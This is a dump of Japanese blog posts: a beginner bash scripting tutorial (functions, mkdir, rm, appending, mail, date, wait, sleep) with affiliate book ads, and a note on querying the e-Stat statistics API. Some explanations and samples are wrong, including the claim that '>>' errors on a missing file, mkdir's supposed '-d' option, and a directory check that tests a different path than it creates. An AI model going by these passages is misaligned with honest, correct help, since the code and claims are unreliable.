$! で取得できます。\n#!/bin/bash for((i=0;i\u0026lt;3;i++));do sleep 5 \u0026amp;; array[i]=$!; echo \u0026#34;Sleeping: ${i} : ${array[i]}\u0026#34;; done wait ${array[@]}; echo \u0026#34;Finish!!\u0026#34;; ヒント 二つのコマンドの違いは以下の通りです。 sleepは指定した時間だけ処理を遅延 waitはプロセスやジョブの終了を待つ 書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-13T11:26:13+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-14-30-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-14-30-suzuki/","title":"【３０．sleepコマンド】ざっくりわかる「シェルスクリプト」"},{"content":"はじめに Bashスクリプトは、シェルコマンドの実行、複数のコマンドの同時実行、管理タスクのカスタマイズ、タスクの自動化の実行など、さまざまな目的に使用できます。したがって、bashプログラミングの基本に関する知識はすべてのLinuxユーザーにとって重要です。この記事は、bashプログラミングの基本的な考え方を理解するのに役立ちます。ここでは、bashスクリプトの一般的な操作のほとんどを、非常に簡単な例で説明します。\nこの記事では、bashプログラミングの次のトピックについて説明します。\n関数からの戻り値の受け渡し 関数からの戻り値の受け渡し：\nBash関数は、数値と文字列値の両方を渡すことができます。関数から文字列値を渡す方法を次の例に示します。\u0026lsquo;function_return.sh\u0026rsquo;という名前のファイルを作成し、次のコードを追加します。関数greeting（）は、文字列値を変数valに返します。この変数は、処理の最後に他の文字列と組み合わせて出力します。\n#!/bin/bash function greeting(){ str=\u0026#34;こんにちは、$name\u0026#34;; echo \u0026#34;$str\u0026#34;; } echo \u0026#34;あなたの名前を入力して下さい\u0026#34;; read name; val=$(greeting); echo \u0026#34;関数からの戻り値は「${val}」です。\u0026#34;; bashコマンドでファイルを実行します。\n$ bash function_return.sh あなたの名前を入力して下さい suzuki 関数からの戻り値は「こんにちは、suzuki」です。 $ 戻り値について bashシェルスクリプトには「戻り値」というものは基本的に存在しない。 解決策として関数やコマンドの「実行結果を直接変数に代入する」という手段をとることになる。\n「return」コマンドは存在するが、あくまで終了ステータスを返しているだけで、関数の戻り値を返す機能ではないので注意しよう。 ディレクトリを作成する ディレクトリを作成する：\nBashは「mkdir」コマンドを使用して新しいディレクトリを作成します。\u0026lsquo;make_directory.sh\u0026rsquo;という名前のファイルを作成し、次のコードを追加して、ユーザーから新しいディレクトリ名を取得します。ディレクトリ名が現在の場所に存在しない場合は、ディレクトリが作成されます。\n#!/bin/bash echo \u0026#34;ディレクトリ名を入力して下さい。\u0026#34; read newdir `mkdir \u0026#34;$newdir\u0026#34;` bashコマンドでファイルを実行します。\n$ bash make_directory.sh ディレクトリ名を入力して下さい。 suzuki $ ls suzuki/ ヒント よく記述していたのは以下のようなコードでした。 事前にディレクトリの存在チェックを行い、見つからなかった場合のみディレクトリを作成します。 #!/bin/bash if [ -d \u0026#34;/tmp/of/work\u0026#34; ];then : # 何もしない else mkdir -p \u0026#34;/tmp/work\u0026#34;; fi cd \u0026#34;/tmp/of/work\u0026#34;; 存在を確認してディレクトリを作成する 存在を確認してディレクトリを作成します。\n\u0026lsquo;mkdir\u0026rsquo;コマンドを実行する前に、現在の場所にディレクトリが存在することを確認する事ができます。mkdir コマンドの\u0026rsquo; -d \u0026lsquo;オプションは、特定のディレクトリが存在するかどうかをテストするためのオプションです。\u0026lsquo;directory_exist.sh\u0026rsquo;という名前のファイルを作成し、次のコードを追加してください。ディレクトリの存在を確認してディレクトリを作成します。\n#!/bin/bash echo \u0026#34;ディレクトリ名を入力して下さい。\u0026#34;; read ndir; if [ -d \u0026#34;$ndir\u0026#34; ];then echo \u0026#34;ディレクトリが存在します。\u0026#34;; else `mkdir $ndir`; echo \u0026#34;ディレクトリを作成しました。\u0026#34;; fi bashコマンドでファイルを実行します。\n$ bash directory_exist.sh ディレクトリ名を入力して下さい。 suzuki ディレクトリを作成しました。 $ ls suzuki/ $ bash directory_exist.sh ディレクトリ名を入力して下さい。 suzuki ディレクトリが存在します。 $ ヒント 実はディレクトリの存在チェックを行わなくても先のスクリプトは問題なく動作します。 mkdir -p コマンドは以下のような挙動をします。 作成対象ディレクトリの親ディレクトリが存在しない場合 はすべての親ディレクトリを作成する\n作成対象ディレクトリがすでに存在している場合 は何も行わず、エラーもはかない #!/bin/bash # 一旦ディレクトリを作成 mkdir -p /tmp/work ls -l -d /tmp/work/ # 出力 # drwxr-xr-x 2 root root 64 Aug 22 08:26 /tmp/work/ # オプション無しですでに存在しているディレクトリを作成 mkdir /tmp/work # 出力 # mkdir: /tmp/work: File exists echo $? # 1 # -pオプション有りだとエラーを吐かない mkdir -p /tmp/work echo $? # 0 $ bash mkdir_example2.sh drwxr-xr-x 2 suzukiiichiro wheel 64 1 21 13:13 /tmp/work/ mkdir: /tmp/work: File exists 1 0 $ ファイルを読む ファイルを読む：\nwhileループでreadコマンドを使用すると、bashで任意のファイルを1行ずつ読み取ることができます。\u0026lsquo;read_file.sh\u0026rsquo;という名前のファイルを作成し、次のコードを追加してください。 別途作成する\u0026rsquo;book.txt\u0026rsquo;の内容を読み取ります。\n「book.txt」ファイルを作成します。\n$ vim book.txt ファイルを読む： ループを使用すると、bashで任意のファイルを1行ずつ読み取ることができます。 \u0026#39;read_file.sh\u0026#39;という名前のファイルを作成し、次のコードを追加して、\u0026#39;book.txt\u0026#39;という名前の既存のファイルを読み取ります。 #!/bin/bash file=\u0026#39;book.txt\u0026#39;; if [ -f \u0026#34;$file\u0026#34; ];then while read line;do echo \u0026#34;$line\u0026#34;; done\u0026lt;$file else echo \u0026#34;$file ファイルがありません\u0026#34;; fi bashコマンドでファイルを実行します。\n$ bash read_file.sh ファイルを読む： ループを使用すると、bashで任意のファイルを1行ずつ読み取ることができます。 \u0026#39;read_file.sh\u0026#39;という名前のファイルを作成し、次のコードを追加して、\u0026#39;book.txt\u0026#39;という名前の既存のファイルを読み取ります。 具体的に以下のファイルを作成してファイルを読み込み、必要な部分を抜き出して表示してみます。\ni-0f6126b7aeedfabd6,hoge i-050536efdd9dc1126,fuga i-0869f24358fb3f698,f8k cat します。\n$ cat instance-tag.list i-0f6126b7aeedfabd6,hoge i-050536efdd9dc1126,fuga i-0869f24358fb3f698,f8k $ 以下のソースファイルを作成します。\n#!/bin/bash # catしてwhile read で1行ずつ読み込む # 「cat instance-tag.list」の結果を1行ずつ「line」 # という変数に代入しています。 cat instance-tag.list | while read line;do # 二つの変数に値切り出して代入 # $()は()内で指定したコマンドの実行結果を返します。 # 今回の場合、「echo $line | cut -d, -f 1」の実行結果が # 「instance_id」に定義されます。 instance_id=$(echo $line | cut -d, -f 1) tag_value=$(echo $line | cut -d, -f 2) # 表示 echo \u0026#34;instance_id: ${instance_id}\u0026#34;; echo \u0026#34;tag_value: ${tag_value}\u0026#34;; done bashコマンドでファイルを実行します。\n$ bash whileread_example2.sh instance_id: i-0f6126b7aeedfabd6 tag_value: hoge instance_id: i-050536efdd9dc1126 tag_value: fuga instance_id: i-0869f24358fb3f698 tag_value: f8k $ ヒント cutコマンドの部分は、awkコマンドを使うこともあります。 今回は、cutの方が処理速度が速いため、cutコマンドを使いました。 ちなみにawkの場合は、以下のように記述します。\ninstance_id=$(echo $line | awk -F, \u0026#39;{print $1;}\u0026#39;); tag_value=$(echo $line | awk -F, \u0026#39;{print $2;}\u0026#39;); ファイルを削除する ファイルを削除します：\n\u0026lsquo;rm\u0026rsquo;コマンドは、ファイルまたはディレクトリを削除するためのコマンドです。次のコードを使用して「delete_file.sh」という名前のファイルを作成し、ユーザーからファイル名を取得して削除します。ここで、「-i」オプションは、ファイルを削除する前にユーザーに削除確認をに使用されます。\n#!/bin/bash echo \u0026#34;削除するファイルまたはディレクトリ名を入力して下さい。\u0026#34; read fn rm -i $fn bashコマンドでファイルを実行します。\n$ ls suzuki/ book.txt bash delete_file.sh 削除するファイルまたはディレクトリ名を入力して下さい。 suzuki rm: suzuki: is a directory bash delete_file.sh 削除するファイルまたはディレクトリ名を入力して下さい。 book.txt $ ls suzuki/ $ ヒント 基本的に、ファイルもディレクトリも削除するコマンドは同じです。ディレクトリには再帰的に（フォルダの階層も含めて）削除するオプション(-r リカーション)があります。 rm\n-f :確認をせずに削除 -r ：再帰的に削除 フォルダを削除\nrm -rf 高度なヒント シェルスクリプトで自動化処理を作成する場合、cp や rm で、確認をせずに実行したいことが多々あります。 この場合は、 /bin/cp\nまたは\n/bin/rm を使うと、確認なしで実行することができます。\nファイルに追加 ファイルに追加：\nbashで「\u0026raquo;」演算子を使用すると、既存のファイルに新しいデータを追加できます。\u0026lsquo;append_file.sh \u0026lsquo;という名前のファイルを作成し、次のコードを追加して、ファイルの最後に新しいコンテンツを追加します。ここで、「Learning Level 5」は、スクリプトの実行後に「book.txt」ファイルのに追加されます。\n1. Pro AngularJS 2. Learning JQuery 3. PHP Programming 4. Code Igniter #!/bin/bash echo \u0026#34;追加する前のファイル\u0026#34;; cat book.txt; echo \u0026#34;5. Bash Programming\u0026#34; \u0026gt;\u0026gt; book.txt echo \u0026#34;追加した後のファイル\u0026#34; cat book.txt; bashコマンドでファイルを実行します。\n$ bash append_file.sh 追加する前のファイル 1. Pro AngularJS 2. Learning JQuery 3. PHP Programming 4. Code Igniter 追加した後のファイル 1. Pro AngularJS 2. Learning JQuery 3. PHP Programming 4. Code Igniter 5. Bash Programming $ ヒント 「\u0026gt;」はファイルを新しく作成して追記します。 「\u0026raquo;」は既に存在するファイルに追記します。ですので、ファイルが存在しないにもかかわらず、「\u0026raquo;」を行うと、ついするファイルがないため、エラーとなります。 ファイルの存在を確認するための方法を次の章で説明します。 ファイルが存在するかどうかを確認 ファイルが存在するかどうかをテストします。\n\u0026lsquo;-e\u0026rsquo;または\u0026rsquo;-f\u0026rsquo;オプションを使用して、ファイルの存在を確認できます。次のコードの \u0026lsquo;if [ ]\u0026lsquo;では、ファイルの存在をテストするために「-f」オプションが使用されています。\u0026rsquo; file_exist.sh \u0026lsquo;という名前のファイルを作成し、次のコードを追加します。ここで、ファイル名はコマンドラインから渡されます。\n#!/bin/bash filename=$1; if [ -f \u0026#34;$filename\u0026#34; ];then echo \u0026#34;ファイルが存在します。\u0026#34;; else echo \u0026#34;ファイルは存在しません。\u0026#34;; fi bashコマンドでファイルを実行します。\n$ ls book.txt level.txt bash file_exist.sh level2.txt ファイルは存在しません。 bash file_exist.sh level.txt ファイルが存在します。 ヒント 「\u0026raquo;」（アペンド）を行う場合の注意点は、必ずアペンドするファイルが存在している必要があるところです。 ファイルが存在していればアペンド（追記）する。 ファイルが存在しなければファイルを作成して追記する。 といった処理が必要で、この処理を行わない場合、ファイルが存在しないにもかかわらず、値をファイルに追記しようとした際にエラーとなります。サンプルを以下に示します。 #!/bin/bash if [ -f level.txt ]; then # ファイルが存在するならば追記する echo \u0026#34;Bash Programming\u0026#34; \u0026gt;\u0026gt; level.txt; else # ファイルが存在しないからlevel.txtを作成してから追記 :\u0026gt; level.txt; echo \u0026#34;Bash Programming\u0026#34; \u0026gt;\u0026gt; level.txt; fi echo \u0026#34;追加した後のファイル\u0026#34; cat level.txt; ヒント touch コマンドと :\u0026gt; の違いを明確にしておく必要があります。 「:\u0026gt;」 は、該当ファイルがなければ作成、あっても空のファイルに置き換えます。 「touch」は、該当ファイルがなければ作成しますが、あれば何もしません。 この違いを利用するとif文はとても簡潔に書き換えることができます。 touchコマンドを使って上記ソースを書き換えてみます。 #!/bin/bash :\u0026gt; level.txt # 新規にファイルを作成 echo \u0026#34;Shell Scripting\u0026#34; \u0026gt;\u0026gt; level.txt; echo \u0026#34;1回目に追加したファイル\u0026#34; cat level.txt; # 既にファイルが存在するので何もしない # 万が一、ファイルが存在しなければ作成。 touch level.txt; echo \u0026#34;Bash Programming\u0026#34; \u0026gt;\u0026gt; level.txt; echo \u0026#34;2回目に追加したファイル\u0026#34; cat level.txt; $ bash bash_append_file3.sh 1回目に追加したファイル Shell Scripting 2回目に追加したファイル Shell Scripting Bash Programming $ mailコマンド メールを送る：\n\u0026rsquo; mail \u0026lsquo;または \u0026rsquo; sendmail \u0026lsquo;コマンドを使用して電子メールを送信できます。これらのコマンドを使用する前に、mailまたはsendmailに必要なパッケージをインストール・設定をする必要があります。\u0026rsquo; mail_example.sh \u0026lsquo;という名前のファイルを作成し、次のコードを追加して電子メールを送信します。\nmailコマンドインストール\nまずはここを参考に\nMacでコマンドからメールを送る Gmail\nlinuxの場合は\n$ yum install mailx 実際にメールを送ってみます。\n$ echo \u0026#34;本文\u0026#34; | mail -s \u0026#34;タイトル\u0026#34; -r from@example.com -c cc1@example.com -c cc2@example.com to1@example.com to2@example.com 恐ろしいほどに簡単ですね。\nおかしな事をかんがえるのはやめましょう。\nシェルスクリプトでサンプルを作る\nadmin@sample.com の部分を自分のメールアドレスに置き換えて実行して下さい。\n#!/bin/bash Recipient=\u0026#34;admin@sample.com\u0026#34; Subject=\u0026#34;Greeting” Message=\u0026#34;Welcome to our site\u0026#34; `mail -s $Subject $Recipient \u0026lt;\u0026lt;\u0026lt; $Message` bashコマンドでファイルを実行します。\n$ bash mail_example.sh $ ヒント くれぐれもおかしな事をかんがえるのはやめましょう。 dateコマンド 現在の日付を解析する：\ndateコマンドを使用して、現在のシステムの日付と時刻の値を取得することができます。日付と時刻は、「Y」、「m」、「d」、「H」、「M」、および「S」を使用します。\u0026lsquo;date_parse.sh\u0026rsquo;という名前の新しいファイルを作成し、次のコードを追加して、日、月、年、時、分、秒の値を表示します。\n#!/bin/bash Year=`date +%Y`; Month=`date +%m`; Day=`date +%d`; Hour=`date +%H`; Minute=`date +%M`; Second=`date +%S`; echo `date`; echo \u0026#34;Current Date is: $Day-$Month-$Year\u0026#34;; echo \u0026#34;Current Time is: $Hour:$Minute:$Second\u0026#34;; bashコマンドでファイルを実行します。\n$ bash date_parse.sh 2022年 1月13日 木曜日 12時19分06秒 JST Current Date is: 13-01-2022 Current Time is: 12:19:06 $ ヒント dateコマンドは覚えるのではなく、manコマンドで都度、探しましょう。きりがないです。できる事を覚えておけばオッケーです。以下にありきたりなパターンを列挙しておきます。 $ date \u0026#39;+%Y/%m/%d\u0026#39; 2005/09/11 $ date \u0026#39;+%Y/%m/%d(%a)\u0026#39; 2005/09/11(Sun) $ date \u0026#39;+%y/%m/%d\u0026#39; 05/09/11 $ date \u0026#39;+%F\u0026#39; 2005-09-11 $ date \u0026#39;+%D\u0026#39; 09/11/05 $ date \u0026#39;+%R\u0026#39; 01:18 $ date \u0026#39;+%T\u0026#39; 01:18:01 $ date \u0026#39;+%r\u0026#39; 01:18:06 AM $ date \u0026#39;+%Y/%m/%d%n%r\u0026#39; 2005/09/11 01:18:27 AM #↑%n を使用することで、出力に改行を含めることができる。 # 1日後 $ date -d \u0026#39;1 day\u0026#39; # 2日後 $ date -d \u0026#39;2 days # 1日前 $ date -d \u0026#39;1 day ago\u0026#39; # 1ヶ月前 $ date -d \u0026#39;1 month ago\u0026#39; # 1年前 $ date -d \u0026#39;1 year ago\u0026#39; # 1時間前 $ date -d \u0026#39;1 hour ago\u0026#39; # 1分前 $ date -d \u0026#39;1 minute ago\u0026#39; # 1秒前 $ date -d \u0026#39;1 second ago\u0026#39; $ IFSBK=${IFS} ; IFS=$\u0026#39;\\n\u0026#39; ; for record in $(cat /var/log/messages ) ; do if [ $(( $(date +\u0026#34;%s\u0026#34;) - 300 )) -lt $(echo ${record} | cut -d\u0026#34; \u0026#34; -f 1,2,3 | date --date=\u0026#34;$(cat -)\u0026#34; +\u0026#34;%s\u0026#34;) ] ; then echo ${record} ; fi ; done | grep error ; IFS=${IFSBK} waitコマンド waitコマンド：\nwaitコマンドは、実行中のプロセスの完了を待機するLinuxの組み込みコマンドです。 waitコマンドは、特定のプロセスIDまたはジョブIDで使用されます。waitコマンドでプロセスIDまたはジョブIDが指定されていない場合、現在のすべての子プロセスが完了するのを待機し、終了ステータスを返します。\u0026rsquo; wait_example.sh\u0026rsquo;という名前のファイルを作成し、次のスクリプトを追加します。\n#!/bin/bash echo \u0026#34;Wait command\u0026#34; \u0026amp; process_id=$! wait $process_id echo \u0026#34;Exited with status $?\u0026#34; bashコマンドでファイルを実行します。\n$ bash wait_example.sh Wait command Exited with status 0 $ わかりにくいですね。\nもう少しわかりやすく説明します。\nwaitコマンドは、他のプロセスの終了まで待機することができるコマンドです。\n例えば、以下三つのファイルを実行します。\n末尾に \u0026amp; がついているのは、それぞれの実行ファイルをバックグラウンドで並列で実行させることを意味しています。\n#!/bin/bash bash a.sh \u0026amp;; bash b.sh \u0026amp;; bash c.sh \u0026amp;; では、三つの実行ファイルが全て完了したらコメントを出力するソースに書き直してみます。\n#!/bin/bash bash a.sh \u0026amp;; bash b.sh \u0026amp;; bash c.sh \u0026amp;; echo \u0026#34;終了しました\u0026#34;; 上記のソースは、実行の終了を待たずに「終了しました」が出力されます。要するに、コメントの出力は全ての実行を待っていない訳です。正しいソースに書き直してみます。\n#!/bin/bash bash a.sh \u0026amp;; bash b.sh \u0026amp;; bash c.sh \u0026amp;; wait; echo \u0026#34;終了しました\u0026#34;; 上記のようにwaitコマンドを挟むことで、a.sh, b.sh, c.sh の実行が終了してから完了メッセージを表示させることが出来ました。\n前の処理終了を待ってから、次の処理を実行する方法は以下の通りです。\n#!/bin/bash command1 \u0026amp; command2 \u0026amp; wait command3 上記の様にすると、command1とcommand2が終了してからcommand3が実行される様にできます。command1と2がバックグラウンドで実行され、waitコマンドで処理終了まで待機し、command3が実行されるといった流れです。\nヒント waitコマンドと似ているsleepコマンドについて、次の章で説明します。またsleepコマンドとwaitコマンドを組み合わせて並列処理を行うサンプルも次の章で示します。 sleepコマンド sleepコマンド：\nコマンドの実行を特定の期間一時停止する場合は、sleepコマンドを使用できます。遅延量は、 秒（s）、分（m）、時間（h）、および日（d）で設定できます。\u0026lsquo;sleep_example.sh\u0026rsquo; という名前のファイルを作成し、次のスクリプトを追加します。このスクリプトは、実行後5秒間待機します。\n#!/bin/bash echo “Wait for 5 seconds” sleep 5 echo “Completed” bashコマンドでファイルを実行します。\n$ bash sleep_example.sh “Wait for 5 seconds” “Completed” $ わかりにくいですね。\n少し高度だけど、わかりやすいサンプルも書いておきます。\nwait コマンドのサンプル sleep コマンドをバックグラウンドで実行させ、前の章で使ったwait コマンドで同期をとります。。バックグランドで実行したコマンドのプロセス ID は $! で取得できます。\n#!/bin/bash for((i=0;i\u0026lt;3;i++));do sleep 5 \u0026amp;; array[i]=$!; echo \u0026#34;Sleeping: ${i} : ${array[i]}\u0026#34;; done wait ${array[@]}; echo \u0026#34;Finish!!\u0026#34;; ヒント 二つのコマンドの違いは以下の通りです。 sleepは指定した時間だけ処理を遅延 waitはプロセスやジョブの終了を待つ 書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-13T11:26:13+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-13-01-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-13-01-suzuki/","title":"【はじめから】ざっくりわかるシェルスクリプト３"},{"content":"e-Statで新着一覧を取得しよう 毎日自動的に処理できるようにしたいので新着一覧を取得する必要があります。\n新着一覧は、リスト取得用のAPIでupdateDateに日付を指定してその日の更新分を取得してくるようにしました。\nwget \u0026#34;https://api.e-stat.go.jp/rest/3.0/app/getSimpleStatsList?updatedDate=20220111\u0026amp;appId=xxxxxxxxxxxx\u0026amp;lang=J\u0026#34; -O new.csv STAT_CODEが政府統計コード、TABLE_INFがデータセットIDになります。\n\u0026#34;0003254482\u0026#34;,\u0026#34;00552010\u0026#34;,\u0026#34;知的財産活動調査\u0026#34;,\u0026#34;00552\u0026#34;,\u0026#34;特許庁\u0026#34;,\u0026#34;知的財産活動調査\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;1-1\u0026#34;,\u0026#34;業種別出願件数階級別 売上高、営業利益高、経常 利益高、従業者数、研究関係従業者数及び研究費\u0026#34;,\u0026#34;（注1）各設問項目によって標本数が異なるため、例えば研究関係従業者数の集計結果が従業者数の集計結果を上回るなど、大小関係の逆転が生じ得る点に留意する必要がある。（注2）業種 「個人」において売上高等の記載される場合があるが、これは事業を営む個人事業主が調査票の業種を「個人」として回答したことによる。\u0026#34;,\u0026#34;業種別出願件数階級別\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;年 度次\u0026#34;,\u0026#34;0\u0026#34;,\u0026#34;2022-01-11\u0026#34;,\u0026#34;0\u0026#34;,\u0026#34;該当なし\u0026#34;,\u0026#34;0\u0026#34;,\u0026#34;2022-01-11\u0026#34;,\u0026#34;11\u0026#34;,\u0026#34;情報通信・科学技術\u0026#34;,\u0026#34;03\u0026#34;,\u0026#34;知的財産\u0026#34; データセットID（TABLE_INF）を使って個別データを取得しましょう。\nwget \u0026#34;http://api.e-stat.go.jp/rest/3.0/app/getSimpleStatsData?appId=xxxxxxxxxxxxxxx\u0026amp;lang=J\u0026amp;statsDataId=0003254482\u0026amp;metaGetFlg=Y\u0026amp;cntGetFlg=N\u0026amp;explanationGetFlg=Y\u0026amp;annotationGetFlg=Y\u0026amp;sectionHeaderFlg=1\u0026amp;replaceSpChars=0\u0026#34; -O 0003254482.csv 知的財産活動調査とは 今日の課題は新着一覧に出てきた「知的財産活動調査」をどう処理するか検討してみましょう。\n知的財産活動調査は、我が国における知的財産活動の現状を定量的に把握することを目的とした一般統計調査とのことです。\n特許権などの利用状況を調査したものみたいです。\nデータセット 知的財産活動調査のデータセット数ですが１４０件もあります。\n統計のデータセット数は１つの時もあればこのように１００を超える時もあるみたいです。\nこれだけデータセット数が多いとこの中から主要なデータセットを選択してサマリーを作成するのは大変ですね。\ngoogle検索で「知的財産活動調査」の分析記事を調べてみると\nhttps://www.semiconportal.com/archive/editorial/industry/17.html\n知的財産担当者数は増加傾向にあり、2004年度は、約45,500人で前年度に比べ16.6 ％増加。\n企業等の知的財産活動費は約9,200 億円で前年度に比べ17.1 ％増加。\n特許権の活用状況 国内における2004年度の特許権の利用率は48.2 ％であり、依然として所有する権利の約半数が利用されていないことがわかる。\nhttps://www.jstage.jst.go.jp/article/jasmin/2018s/0/2018s_246/_article/-char/ja/\n研究開発活動が利益率に対して最も顕著なプラスの効果を持っていたのは「医薬品製造業」であった．また，研究費投資から利益率向上には25年程度のラグがあることも示された\n「知的財産担当者数」「知的財産活動費」「特許権の利用率」あたりがよく出るキーワードみたいです。\n主要なキーワードの抽出方法なのですが、「知的財産活動調査」のように統計名でgoogle検索した結果に対して、「知的財産担当者数」「知的財産活動費」などのデータセット名で検索して件数が多いものを主要なキーワードとして取り扱うことができるか検討してみたいと思います。\n「利益率」という面白いキーワードがあったのですが、統計の中にはそのままのデータはありませんでした。「経常利益高」という項目があるのでこれを「知的財産活動費」で割り算する必要がありそうです。\n「利益率」が出せそうなら出してみるというのも検討してみると面白いかもしれません。\n主要なキーワードとしては、「知的財産担当者数」「知的財産活動費」「特許権の利用率」のようにその統計に固有のものもありますが、「利益率」「担当者数」「費用」「利用率」など汎用的に重要な項目もあるのかなと思いました。\nデータセットの先頭にある「売上高、営業利益高、経常利益高、従業者数、研究関係従業者数及び研究費」は「特許権の利用率」は含まないものの「経常利益高」「知的財産担当者数」「知的財産活動費」を含むものでした。\nデータセットが大量にある統計の場合先頭のデータセットはまとめ的なデータになるのでしょうか。他の統計も見てみようと思います。\nデータセットの中に「標本数」というものがありました。「標本数」は、アンケート結果の回収数です。データの信用性を図る上では大切な項目ですが、サマリーを作成する際は除外しても良い項目かもしれません。\n知的財産担当者数 知的財産活動費 